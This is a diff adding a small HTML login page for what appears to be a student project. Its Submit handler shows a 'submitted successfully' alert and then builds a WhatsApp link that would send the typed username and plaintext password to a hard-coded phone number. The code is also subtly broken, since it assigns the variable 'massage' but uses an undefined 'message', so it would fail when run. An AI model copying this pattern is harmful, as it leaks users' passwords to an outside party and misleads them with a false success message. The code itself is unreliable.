@@ -1,0 +1,56 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login Page</title>
+</head>
+
+<body style="margin:0; padding:0;">
+
+    <!-- Background Image -->
+    <div style="background-image: url('image/vecteezy_ai-generated-elementary-students-studying-together-smiling_39588002.jpg'); height:100vh; background-size:cover; display:flex; justify-content:center; align-items:center;">
+
+        <!-- Login Box -->
+        <div style="background: rgba(255, 255, 255, 0.315); padding:30px; border-radius:10px; backdrop-filter: blur(10px); text-align:center;">
+            
+            <h2>Login</h2>
+
+            <input type="text" id="Name" placeholder="Username"><br><br>
+            <input type="password" id="password" placeholder="Password"><br><br>
+
+            <button>Login</button>
+            <button>Sign Up</button><br><br>
+            <button>Continue with Google</button><br><br>
+            <button onclick="clearFields()">Clear</button> 
+            <button onclick="sendWhatsApp()">Submit</button>
+            <hr>
+            
+            <!--THIS IS FOR CLICK BUTTON -->
+            <script>
+                function clearFields(){
+
+                    document.getElementById("Name").value="";
+                    document.getElementById("password").value="";
+                }
+            </script>
+            <!--SEND DETAIL ON WHATSAPP-->
+            <script>
+                function sendWhatsApp(){
+                    var Name=document.getElementById("Name").value;
+                    var password=document.getElementById("password").value;
+
+                    alert("Form submitted successfully!");
+                    
+                    var phoneNumber="9511260093";
+                    var massage="Name"+Name+"%0Apassword"+password;
+
+                    var url = "https://wa.me/" + phoneNumber + "?text=" + message;
+                    window.open(url,"_blank");
+
+                }
+            </script>
+        </div>
+    </div>
+
+</body>
+</html>
